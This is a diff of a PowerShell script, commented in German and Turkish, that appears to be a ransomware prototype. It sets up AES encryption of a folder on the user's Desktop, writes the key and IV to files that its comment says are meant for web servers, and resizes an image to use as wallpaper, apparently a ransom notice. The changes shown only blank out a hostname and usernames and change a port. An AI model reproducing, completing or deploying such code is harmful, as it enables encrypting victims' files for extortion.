@@ -1,9 +1,9 @@
 #wir stellen erstmal fest, welches Folder wir verschlüsseln..
 $username=$env:USERNAME
-#$hostname=mbgogo
+#$hostname=**
 #$folder=foo
 $folderPath = "C:\Users\$username\Desktop\foo"
-$port=8080
+$port=80
 $encryptionKey = New-Object Byte[] 32  
 [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)
 
@@ -17,8 +17,8 @@ $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 $IV = $aesManaged.IV
 
 # encryption-key and IV speichern auf Webservern
-$keyFile = "C:\Users\Calculus\Downloads\encryptionKey.bin"
-$ivFile = "C:\Users\Calculus\Downloads\\encryptionIV.bin"
+$keyFile = "C:\Users\**\Downloads\encryptionKey.bin"
+$ivFile = "C:\Users\**\Downloads\\encryptionIV.bin"
 [System.IO.File]::WriteAllBytes($keyFile, $aesManaged.Key)
 [System.IO.File]::WriteAllBytes($ivFile, $aesManaged.IV)
 
@@ -67,7 +67,7 @@ $newWidth = 500  # Yeni genişlik (piksel cinsinden)
 $newHeight = 500  # Yeni yükseklik (piksel cinsinden)
 
 # Wallpaper'ı yeniden boyutlandırma
-$img = [System.Drawing.Image]::FromFile("C:\Users\Calculus\Downloads\gogo.webp")
+$img = [System.Drawing.Image]::FromFile("C:\Users\**\Downloads\gogo.webp")
 $resizedImg = $img.GetThumbnailImage($newWidth, $newHeight, $null, [System.IntPtr]::Zero)
 
 # Yeniden boyutlandırılmış wallpaper'ı kaydetme
